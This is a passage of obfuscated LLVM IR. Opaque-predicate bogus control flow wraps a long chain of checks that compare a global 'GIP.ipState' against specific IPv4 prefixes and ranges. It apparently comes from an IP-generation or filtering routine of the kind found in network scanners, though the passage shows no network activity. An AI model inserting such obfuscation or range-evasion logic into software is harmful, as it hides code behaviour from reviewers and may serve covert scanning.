  %2712 = icmp slt i32 %2707, 10
  %2713 = or i1 %2711, %2712
  br i1 %2713, label %originalBBpart2378, label %originalBB376alteredBB

originalBBpart2378:                               ; preds = %originalBB376
  br i1 %2705, label %2714, label %2742

; <label>:2714:                                   ; preds = %originalBBpart2378
  %2715 = load i32, i32* @x.69
  %2716 = load i32, i32* @y.70
  %2717 = sub i32 %2715, 1
  %2718 = mul i32 %2715, %2717
  %2719 = urem i32 %2718, 2
  %2720 = icmp eq i32 %2719, 0
  %2721 = icmp slt i32 %2716, 10
  %2722 = or i1 %2720, %2721
  br i1 %2722, label %originalBB380, label %originalBB380alteredBB

originalBB380:                                    ; preds = %originalBB380alteredBB, %2714
  %2723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2724 = zext i8 %2723 to i32
  %2725 = icmp eq i32 %2724, 85
  %2726 = load i32, i32* @x.69
  %2727 = load i32, i32* @y.70
  %2728 = sub i32 %2726, 1
  %2729 = mul i32 %2726, %2728
  %2730 = urem i32 %2729, 2
  %2731 = icmp eq i32 %2730, 0
  %2732 = icmp slt i32 %2727, 10
  %2733 = or i1 %2731, %2732
  br i1 %2733, label %originalBBpart2382, label %originalBB380alteredBB

originalBBpart2382:                               ; preds = %originalBB380
  br i1 %2725, label %2734, label %2742

; <label>:2734:                                   ; preds = %originalBBpart2382
  %2735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2736 = zext i8 %2735 to i32
  %2737 = icmp sge i32 %2736, 8
  br i1 %2737, label %2738, label %2742

; <label>:2738:                                   ; preds = %2734
  %2739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2740 = zext i8 %2739 to i32
  %2741 = icmp slt i32 %2740, 63
  br i1 %2741, label %4994, label %2742

; <label>:2742:                                   ; preds = %2738, %2734, %originalBBpart2382, %originalBBpart2378
  %2743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2744 = zext i8 %2743 to i32
  %2745 = icmp eq i32 %2744, 64
  br i1 %2745, label %2746, label %2790

; <label>:2746:                                   ; preds = %2742
  %2747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2748 = zext i8 %2747 to i32
  %2749 = icmp eq i32 %2748, 237
  br i1 %2749, label %2750, label %2790

; <label>:2750:                                   ; preds = %2746
  %2751 = load i32, i32* @x.69
  %2752 = load i32, i32* @y.70
  %2753 = sub i32 %2751, 1
  %2754 = mul i32 %2751, %2753
  %2755 = urem i32 %2754, 2
  %2756 = icmp eq i32 %2755, 0
  %2757 = icmp slt i32 %2752, 10
  %2758 = or i1 %2756, %2757
  br i1 %2758, label %originalBB384, label %originalBB384alteredBB

originalBB384:                                    ; preds = %originalBB384alteredBB, %2750
  %2759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2760 = zext i8 %2759 to i32
  %2761 = icmp sge i32 %2760, 32
  %2762 = load i32, i32* @x.69
  %2763 = load i32, i32* @y.70
  %2764 = sub i32 %2762, 1
  %2765 = mul i32 %2762, %2764
  %2766 = urem i32 %2765, 2
  %2767 = icmp eq i32 %2766, 0
  %2768 = icmp slt i32 %2763, 10
  %2769 = or i1 %2767, %2768
  br i1 %2769, label %originalBBpart2386, label %originalBB384alteredBB

originalBBpart2386:                               ; preds = %originalBB384
  br i1 %2761, label %2770, label %2790

; <label>:2770:                                   ; preds = %originalBBpart2386
  %2771 = load i32, i32* @x.69
  %2772 = load i32, i32* @y.70
  %2773 = sub i32 %2771, 1
  %2774 = mul i32 %2771, %2773
  %2775 = urem i32 %2774, 2
  %2776 = icmp eq i32 %2775, 0
  %2777 = icmp slt i32 %2772, 10
  %2778 = or i1 %2776, %2777
  br i1 %2778, label %originalBB388, label %originalBB388alteredBB

originalBB388:                                    ; preds = %originalBB388alteredBB, %2770
  %2779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2780 = zext i8 %2779 to i32
  %2781 = icmp slt i32 %2780, 43
  %2782 = load i32, i32* @x.69
  %2783 = load i32, i32* @y.70
  %2784 = sub i32 %2782, 1
  %2785 = mul i32 %2782, %2784
  %2786 = urem i32 %2785, 2
  %2787 = icmp eq i32 %2786, 0
  %2788 = icmp slt i32 %2783, 10
  %2789 = or i1 %2787, %2788
  br i1 %2789, label %originalBBpart2390, label %originalBB388alteredBB

originalBBpart2390:                               ; preds = %originalBB388
  br i1 %2781, label %4994, label %2790

; <label>:2790:                                   ; preds = %originalBBpart2390, %originalBBpart2386, %2746, %2742
  %2791 = load i32, i32* @x.69
  %2792 = load i32, i32* @y.70
  %2793 = sub i32 %2791, 1
  %2794 = mul i32 %2791, %2793
  %2795 = urem i32 %2794, 2
  %2796 = icmp eq i32 %2795, 0
  %2797 = icmp slt i32 %2792, 10
  %2798 = or i1 %2796, %2797
  br i1 %2798, label %originalBB392, label %originalBB392alteredBB

originalBB392:                                    ; preds = %originalBB392alteredBB, %2790
  %2799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2800 = zext i8 %2799 to i32
  %2801 = icmp eq i32 %2800, 185
  %2802 = load i32, i32* @x.69
  %2803 = load i32, i32* @y.70
  %2804 = sub i32 %2802, 1
  %2805 = mul i32 %2802, %2804
  %2806 = urem i32 %2805, 2
  %2807 = icmp eq i32 %2806, 0
  %2808 = icmp slt i32 %2803, 10
  %2809 = or i1 %2807, %2808
  br i1 %2809, label %originalBBpart2394, label %originalBB392alteredBB

originalBBpart2394:                               ; preds = %originalBB392
  br i1 %2801, label %2810, label %2854

; <label>:2810:                                   ; preds = %originalBBpart2394
  %2811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2812 = zext i8 %2811 to i32
  %2813 = icmp eq i32 %2812, 92
  br i1 %2813, label %2814, label %2854

; <label>:2814:                                   ; preds = %2810
  %2815 = load i32, i32* @x.69
  %2816 = load i32, i32* @y.70
  %2817 = sub i32 %2815, 1
  %2818 = mul i32 %2815, %2817
  %2819 = urem i32 %2818, 2
  %2820 = icmp eq i32 %2819, 0
  %2821 = icmp slt i32 %2816, 10
  %2822 = or i1 %2820, %2821
  br i1 %2822, label %originalBB396, label %originalBB396alteredBB

originalBB396:                                    ; preds = %originalBB396alteredBB, %2814
  %2823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2824 = zext i8 %2823 to i32
  %2825 = icmp sge i32 %2824, 220
  %2826 = load i32, i32* @x.69
  %2827 = load i32, i32* @y.70
  %2828 = sub i32 %2826, 1
  %2829 = mul i32 %2826, %2828
  %2830 = urem i32 %2829, 2
  %2831 = icmp eq i32 %2830, 0
  %2832 = icmp slt i32 %2827, 10
  %2833 = or i1 %2831, %2832
  br i1 %2833, label %originalBBpart2398, label %originalBB396alteredBB

originalBBpart2398:                               ; preds = %originalBB396
  br i1 %2825, label %2834, label %2854

; <label>:2834:                                   ; preds = %originalBBpart2398
  %2835 = load i32, i32* @x.69
  %2836 = load i32, i32* @y.70
  %2837 = sub i32 %2835, 1
  %2838 = mul i32 %2835, %2837
  %2839 = urem i32 %2838, 2
  %2840 = icmp eq i32 %2839, 0
  %2841 = icmp slt i32 %2836, 10
  %2842 = or i1 %2840, %2841
  br i1 %2842, label %originalBB400, label %originalBB400alteredBB

originalBB400:                                    ; preds = %originalBB400alteredBB, %2834
  %2843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2844 = zext i8 %2843 to i32
  %2845 = icmp slt i32 %2844, 223
  %2846 = load i32, i32* @x.69
  %2847 = load i32, i32* @y.70
  %2848 = sub i32 %2846, 1
  %2849 = mul i32 %2846, %2848
  %2850 = urem i32 %2849, 2
  %2851 = icmp eq i32 %2850, 0
  %2852 = icmp slt i32 %2847, 10
  %2853 = or i1 %2851, %2852
  br i1 %2853, label %originalBBpart2402, label %originalBB400alteredBB

originalBBpart2402:                               ; preds = %originalBB400
  br i1 %2845, label %4994, label %2854

; <label>:2854:                                   ; preds = %originalBBpart2402, %originalBBpart2398, %2810, %originalBBpart2394
  %2855 = load i32, i32* @x.69
  %2856 = load i32, i32* @y.70
  %2857 = sub i32 %2855, 1
  %2858 = mul i32 %2855, %2857
  %2859 = urem i32 %2858, 2
  %2860 = icmp eq i32 %2859, 0
  %2861 = icmp slt i32 %2856, 10
  %2862 = or i1 %2860, %2861
  br i1 %2862, label %originalBB404, label %originalBB404alteredBB

originalBB404:                                    ; preds = %originalBB404alteredBB, %2854
  %2863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2864 = zext i8 %2863 to i32
  %2865 = icmp eq i32 %2864, 104
  %2866 = load i32, i32* @x.69
  %2867 = load i32, i32* @y.70
  %2868 = sub i32 %2866, 1
  %2869 = mul i32 %2866, %2868
  %2870 = urem i32 %2869, 2
  %2871 = icmp eq i32 %2870, 0
  %2872 = icmp slt i32 %2867, 10
  %2873 = or i1 %2871, %2872
  br i1 %2873, label %originalBBpart2406, label %originalBB404alteredBB

originalBBpart2406:                               ; preds = %originalBB404
  br i1 %2865, label %2874, label %2886

; <label>:2874:                                   ; preds = %originalBBpart2406
  %2875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2876 = zext i8 %2875 to i32
  %2877 = icmp eq i32 %2876, 238
  br i1 %2877, label %2878, label %2886

; <label>:2878:                                   ; preds = %2874
  %2879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2880 = zext i8 %2879 to i32
  %2881 = icmp sge i32 %2880, 128
  br i1 %2881, label %2882, label %2886

; <label>:2882:                                   ; preds = %2878
  %2883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2884 = zext i8 %2883 to i32
  %2885 = icmp slt i32 %2884, 191
  br i1 %2885, label %4994, label %2886

; <label>:2886:                                   ; preds = %2882, %2878, %2874, %originalBBpart2406
  %2887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2888 = zext i8 %2887 to i32
  %2889 = icmp eq i32 %2888, 209
  br i1 %2889, label %2890, label %2934

; <label>:2890:                                   ; preds = %2886
  %2891 = load i32, i32* @x.69
  %2892 = load i32, i32* @y.70
  %2893 = sub i32 %2891, 1
  %2894 = mul i32 %2891, %2893
  %2895 = urem i32 %2894, 2
  %2896 = icmp eq i32 %2895, 0
  %2897 = icmp slt i32 %2892, 10
  %2898 = or i1 %2896, %2897
  br i1 %2898, label %originalBB408, label %originalBB408alteredBB

originalBB408:                                    ; preds = %originalBB408alteredBB, %2890
  %2899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2900 = zext i8 %2899 to i32
  %2901 = icmp eq i32 %2900, 222
  %2902 = load i32, i32* @x.69
  %2903 = load i32, i32* @y.70
  %2904 = sub i32 %2902, 1
  %2905 = mul i32 %2902, %2904
  %2906 = urem i32 %2905, 2
  %2907 = icmp eq i32 %2906, 0
  %2908 = icmp slt i32 %2903, 10
  %2909 = or i1 %2907, %2908
  br i1 %2909, label %originalBBpart2410, label %originalBB408alteredBB

originalBBpart2410:                               ; preds = %originalBB408
  br i1 %2901, label %2910, label %2934

; <label>:2910:                                   ; preds = %originalBBpart2410
  %2911 = load i32, i32* @x.69
  %2912 = load i32, i32* @y.70
  %2913 = sub i32 %2911, 1
  %2914 = mul i32 %2911, %2913
  %2915 = urem i32 %2914, 2
  %2916 = icmp eq i32 %2915, 0
  %2917 = icmp slt i32 %2912, 10
  %2918 = or i1 %2916, %2917
  br i1 %2918, label %originalBB412, label %originalBB412alteredBB

originalBB412:                                    ; preds = %originalBB412alteredBB, %2910
  %2919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2920 = zext i8 %2919 to i32
  %2921 = icmp sge i32 %2920, 1
  %2922 = load i32, i32* @x.69
  %2923 = load i32, i32* @y.70
  %2924 = sub i32 %2922, 1
  %2925 = mul i32 %2922, %2924
  %2926 = urem i32 %2925, 2
  %2927 = icmp eq i32 %2926, 0
  %2928 = icmp slt i32 %2923, 10
  %2929 = or i1 %2927, %2928
  br i1 %2929, label %originalBBpart2414, label %originalBB412alteredBB

originalBBpart2414:                               ; preds = %originalBB412
  br i1 %2921, label %2930, label %2934

; <label>:2930:                                   ; preds = %originalBBpart2414
  %2931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2932 = zext i8 %2931 to i32
  %2933 = icmp slt i32 %2932, 31
  br i1 %2933, label %4994, label %2934

; <label>:2934:                                   ; preds = %2930, %originalBBpart2414, %originalBBpart2410, %2886
  %2935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2936 = zext i8 %2935 to i32
  %2937 = icmp eq i32 %2936, 208
  br i1 %2937, label %2938, label %2998

; <label>:2938:                                   ; preds = %2934
  %2939 = load i32, i32* @x.69
  %2940 = load i32, i32* @y.70
  %2941 = sub i32 %2939, 1
  %2942 = mul i32 %2939, %2941
  %2943 = urem i32 %2942, 2
  %2944 = icmp eq i32 %2943, 0
  %2945 = icmp slt i32 %2940, 10
  %2946 = or i1 %2944, %2945
  br i1 %2946, label %originalBB416, label %originalBB416alteredBB

originalBB416:                                    ; preds = %originalBB416alteredBB, %2938
  %2947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2948 = zext i8 %2947 to i32
  %2949 = icmp eq i32 %2948, 167
  %2950 = load i32, i32* @x.69
  %2951 = load i32, i32* @y.70
  %2952 = sub i32 %2950, 1
  %2953 = mul i32 %2950, %2952
  %2954 = urem i32 %2953, 2
  %2955 = icmp eq i32 %2954, 0
  %2956 = icmp slt i32 %2951, 10
  %2957 = or i1 %2955, %2956
  br i1 %2957, label %originalBBpart2418, label %originalBB416alteredBB

originalBBpart2418:                               ; preds = %originalBB416
  br i1 %2949, label %2958, label %2998

; <label>:2958:                                   ; preds = %originalBBpart2418
  %2959 = load i32, i32* @x.69
  %2960 = load i32, i32* @y.70
  %2961 = sub i32 %2959, 1
  %2962 = mul i32 %2959, %2961
  %2963 = urem i32 %2962, 2
  %2964 = icmp eq i32 %2963, 0
  %2965 = icmp slt i32 %2960, 10
  %2966 = or i1 %2964, %2965
  br i1 %2966, label %originalBB420, label %originalBB420alteredBB

originalBB420:                                    ; preds = %originalBB420alteredBB, %2958
  %2967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2968 = zext i8 %2967 to i32
  %2969 = icmp sge i32 %2968, 232
  %2970 = load i32, i32* @x.69
  %2971 = load i32, i32* @y.70
  %2972 = sub i32 %2970, 1
  %2973 = mul i32 %2970, %2972
  %2974 = urem i32 %2973, 2
  %2975 = icmp eq i32 %2974, 0
  %2976 = icmp slt i32 %2971, 10
  %2977 = or i1 %2975, %2976
  br i1 %2977, label %originalBBpart2422, label %originalBB420alteredBB

originalBBpart2422:                               ; preds = %originalBB420
  br i1 %2969, label %2978, label %2998

; <label>:2978:                                   ; preds = %originalBBpart2422
  %2979 = load i32, i32* @x.69
  %2980 = load i32, i32* @y.70
  %2981 = sub i32 %2979, 1
  %2982 = mul i32 %2979, %2981
  %2983 = urem i32 %2982, 2
  %2984 = icmp eq i32 %2983, 0
  %2985 = icmp slt i32 %2980, 10
  %2986 = or i1 %2984, %2985
  br i1 %2986, label %originalBB424, label %originalBB424alteredBB

originalBB424:                                    ; preds = %originalBB424alteredBB, %2978
  %2987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2988 = zext i8 %2987 to i32
  %2989 = icmp slt i32 %2988, 252
  %2990 = load i32, i32* @x.69
  %2991 = load i32, i32* @y.70
  %2992 = sub i32 %2990, 1
  %2993 = mul i32 %2990, %2992
  %2994 = urem i32 %2993, 2
  %2995 = icmp eq i32 %2994, 0
  %2996 = icmp slt i32 %2991, 10
  %2997 = or i1 %2995, %2996
  br i1 %2997, label %originalBBpart2426, label %originalBB424alteredBB

originalBBpart2426:                               ; preds = %originalBB424
  br i1 %2989, label %4994, label %2998

; <label>:2998:                                   ; preds = %originalBBpart2426, %originalBBpart2422, %originalBBpart2418, %2934
  %2999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3000 = zext i8 %2999 to i32
  %3001 = icmp eq i32 %3000, 66
  br i1 %3001, label %3002, label %3014

; <label>:3002:                                   ; preds = %2998
  %3003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3004 = zext i8 %3003 to i32
  %3005 = icmp eq i32 %3004, 55
  br i1 %3005, label %3006, label %3014

; <label>:3006:                                   ; preds = %3002
  %3007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3008 = zext i8 %3007 to i32
  %3009 = icmp sge i32 %3008, 128
  br i1 %3009, label %3010, label %3014

; <label>:3010:                                   ; preds = %3006
  %3011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3012 = zext i8 %3011 to i32
  %3013 = icmp slt i32 %3012, 159
  br i1 %3013, label %4994, label %3014

; <label>:3014:                                   ; preds = %3010, %3006, %3002, %2998
  %3015 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3016 = zext i8 %3015 to i32
  %3017 = icmp eq i32 %3016, 45
  br i1 %3017, label %3018, label %3046

; <label>:3018:                                   ; preds = %3014
  %3019 = load i32, i32* @x.69
  %3020 = load i32, i32* @y.70
  %3021 = sub i32 %3019, 1
  %3022 = mul i32 %3019, %3021
  %3023 = urem i32 %3022, 2
  %3024 = icmp eq i32 %3023, 0
  %3025 = icmp slt i32 %3020, 10
  %3026 = or i1 %3024, %3025
  br i1 %3026, label %originalBB428, label %originalBB428alteredBB

originalBB428:                                    ; preds = %originalBB428alteredBB, %3018
  %3027 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3028 = zext i8 %3027 to i32
  %3029 = icmp eq i32 %3028, 63
  %3030 = load i32, i32* @x.69
  %3031 = load i32, i32* @y.70
  %3032 = sub i32 %3030, 1
  %3033 = mul i32 %3030, %3032
  %3034 = urem i32 %3033, 2
  %3035 = icmp eq i32 %3034, 0
  %3036 = icmp slt i32 %3031, 10
  %3037 = or i1 %3035, %3036
  br i1 %3037, label %originalBBpart2430, label %originalBB428alteredBB

originalBBpart2430:                               ; preds = %originalBB428
  br i1 %3029, label %3038, label %3046

; <label>:3038:                                   ; preds = %originalBBpart2430
  %3039 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3040 = zext i8 %3039 to i32
  %3041 = icmp sge i32 %3040, 1
  br i1 %3041, label %3042, label %3046

; <label>:3042:                                   ; preds = %3038
  %3043 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3044 = zext i8 %3043 to i32
  %3045 = icmp slt i32 %3044, 127
  br i1 %3045, label %4994, label %3046

; <label>:3046:                                   ; preds = %3042, %3038, %originalBBpart2430, %3014
  %3047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3048 = zext i8 %3047 to i32
  %3049 = icmp eq i32 %3048, 216
  br i1 %3049, label %3050, label %3078

; <label>:3050:                                   ; preds = %3046
  %3051 = load i32, i32* @x.69
  %3052 = load i32, i32* @y.70
  %3053 = sub i32 %3051, 1
  %3054 = mul i32 %3051, %3053
  %3055 = urem i32 %3054, 2
  %3056 = icmp eq i32 %3055, 0
  %3057 = icmp slt i32 %3052, 10
  %3058 = or i1 %3056, %3057
  br i1 %3058, label %originalBB432, label %originalBB432alteredBB

originalBB432:                                    ; preds = %originalBB432alteredBB, %3050
  %3059 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3060 = zext i8 %3059 to i32
  %3061 = icmp eq i32 %3060, 237
  %3062 = load i32, i32* @x.69
  %3063 = load i32, i32* @y.70
  %3064 = sub i32 %3062, 1
  %3065 = mul i32 %3062, %3064
  %3066 = urem i32 %3065, 2
  %3067 = icmp eq i32 %3066, 0
  %3068 = icmp slt i32 %3063, 10
  %3069 = or i1 %3067, %3068
  br i1 %3069, label %originalBBpart2434, label %originalBB432alteredBB

originalBBpart2434:                               ; preds = %originalBB432
  br i1 %3061, label %3070, label %3078

; <label>:3070:                                   ; preds = %originalBBpart2434
  %3071 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3072 = zext i8 %3071 to i32
  %3073 = icmp sge i32 %3072, 128
  br i1 %3073, label %3074, label %3078

; <label>:3074:                                   ; preds = %3070
  %3075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3076 = zext i8 %3075 to i32
  %3077 = icmp slt i32 %3076, 159
  br i1 %3077, label %4994, label %3078

; <label>:3078:                                   ; preds = %3074, %3070, %originalBBpart2434, %3046
  %3079 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3080 = zext i8 %3079 to i32
  %3081 = icmp eq i32 %3080, 108
  br i1 %3081, label %3082, label %3086

; <label>:3082:                                   ; preds = %3078
  %3083 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3084 = zext i8 %3083 to i32
  %3085 = icmp eq i32 %3084, 61
  br i1 %3085, label %4994, label %3086

; <label>:3086:                                   ; preds = %3082, %3078
  %3087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3088 = zext i8 %3087 to i32
  %3089 = icmp eq i32 %3088, 45
  br i1 %3089, label %3090, label %3094

; <label>:3090:                                   ; preds = %3086
  %3091 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3092 = zext i8 %3091 to i32
  %3093 = icmp eq i32 %3092, 76
  br i1 %3093, label %4994, label %3094

; <label>:3094:                                   ; preds = %3090, %3086
  %3095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3096 = zext i8 %3095 to i32
  %3097 = icmp eq i32 %3096, 185
  br i1 %3097, label %3098, label %3110

; <label>:3098:                                   ; preds = %3094
  %3099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3100 = zext i8 %3099 to i32
  %3101 = icmp eq i32 %3100, 11
  br i1 %3101, label %3102, label %3110

; <label>:3102:                                   ; preds = %3098
  %3103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3104 = zext i8 %3103 to i32
  %3105 = icmp sge i32 %3104, 144
  br i1 %3105, label %3106, label %3110

; <label>:3106:                                   ; preds = %3102
  %3107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3108 = zext i8 %3107 to i32
  %3109 = icmp slt i32 %3108, 148
  br i1 %3109, label %4994, label %3110

; <label>:3110:                                   ; preds = %3106, %3102, %3098, %3094
  %3111 = load i32, i32* @x.69
  %3112 = load i32, i32* @y.70
  %3113 = sub i32 %3111, 1
  %3114 = mul i32 %3111, %3113
  %3115 = urem i32 %3114, 2
  %3116 = icmp eq i32 %3115, 0
  %3117 = icmp slt i32 %3112, 10
  %3118 = or i1 %3116, %3117
  br i1 %3118, label %originalBB436, label %originalBB436alteredBB

originalBB436:                                    ; preds = %originalBB436alteredBB, %3110
  %3119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3120 = zext i8 %3119 to i32
  %3121 = icmp eq i32 %3120, 185
  %3122 = load i32, i32* @x.69
  %3123 = load i32, i32* @y.70
  %3124 = sub i32 %3122, 1
  %3125 = mul i32 %3122, %3124
  %3126 = urem i32 %3125, 2
  %3127 = icmp eq i32 %3126, 0
  %3128 = icmp slt i32 %3123, 10
  %3129 = or i1 %3127, %3128
  br i1 %3129, label %originalBBpart2438, label %originalBB436alteredBB

originalBBpart2438:                               ; preds = %originalBB436
  br i1 %3121, label %3130, label %3142

; <label>:3130:                                   ; preds = %originalBBpart2438
  %3131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3132 = zext i8 %3131 to i32
  %3133 = icmp eq i32 %3132, 56
  br i1 %3133, label %3134, label %3142

; <label>:3134:                                   ; preds = %3130
  %3135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3136 = zext i8 %3135 to i32
  %3137 = icmp sge i32 %3136, 21
  br i1 %3137, label %3138, label %3142

; <label>:3138:                                   ; preds = %3134
  %3139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3140 = zext i8 %3139 to i32
  %3141 = icmp slt i32 %3140, 23
  br i1 %3141, label %4994, label %3142

; <label>:3142:                                   ; preds = %3138, %3134, %3130, %originalBBpart2438
  %3143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3144 = zext i8 %3143 to i32
  %3145 = icmp eq i32 %3144, 185
  br i1 %3145, label %3146, label %3158

; <label>:3146:                                   ; preds = %3142
  %3147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3148 = zext i8 %3147 to i32
  %3149 = icmp eq i32 %3148, 61
  br i1 %3149, label %3150, label %3158

; <label>:3150:                                   ; preds = %3146
  %3151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3152 = zext i8 %3151 to i32
  %3153 = icmp sge i32 %3152, 136
  br i1 %3153, label %3154, label %3158

; <label>:3154:                                   ; preds = %3150
  %3155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3156 = zext i8 %3155 to i32
  %3157 = icmp slt i32 %3156, 139
  br i1 %3157, label %4994, label %3158

; <label>:3158:                                   ; preds = %3154, %3150, %3146, %3142
  %3159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3160 = zext i8 %3159 to i32
  %3161 = icmp eq i32 %3160, 185
  br i1 %3161, label %3162, label %3174

; <label>:3162:                                   ; preds = %3158
  %3163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3164 = zext i8 %3163 to i32
  %3165 = icmp eq i32 %3164, 62
  br i1 %3165, label %3166, label %3174

; <label>:3166:                                   ; preds = %3162
  %3167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3168 = zext i8 %3167 to i32
  %3169 = icmp sge i32 %3168, 187
  br i1 %3169, label %3170, label %3174

; <label>:3170:                                   ; preds = %3166
  %3171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3172 = zext i8 %3171 to i32
  %3173 = icmp slt i32 %3172, 191
  br i1 %3173, label %4994, label %3174

; <label>:3174:                                   ; preds = %3170, %3166, %3162, %3158
  %3175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3176 = zext i8 %3175 to i32
  %3177 = icmp eq i32 %3176, 66
  br i1 %3177, label %3178, label %3190

; <label>:3178:                                   ; preds = %3174
  %3179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3180 = zext i8 %3179 to i32
  %3181 = icmp eq i32 %3180, 150
  br i1 %3181, label %3182, label %3190

; <label>:3182:                                   ; preds = %3178
  %3183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3184 = zext i8 %3183 to i32
  %3185 = icmp sge i32 %3184, 120
  br i1 %3185, label %3186, label %3190

; <label>:3186:                                   ; preds = %3182
  %3187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3188 = zext i8 %3187 to i32
  %3189 = icmp slt i32 %3188, 215
  br i1 %3189, label %4994, label %3190

